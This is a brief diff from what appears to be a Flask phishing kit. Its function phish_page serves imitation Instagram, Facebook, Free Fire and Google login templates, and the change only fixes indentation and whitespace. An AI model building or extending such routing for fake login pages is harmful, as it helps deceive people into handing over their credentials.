@@ -244,13 +244,13 @@ def phish_page(link_id):
 
     conn.close()
 
- if template_name == 'instagram':
+  if template_name == 'instagram':
     return render_template('instagram.html')
 elif template_name == 'facebook':
     return render_template('facebook.html')
 elif template_name == 'freefire':
     return render_template('freefire.html')
-elif template_name == 'google':                
+elif template_name == 'google':
     return render_template('google.html')
 else:
     return "Invalid template", 400
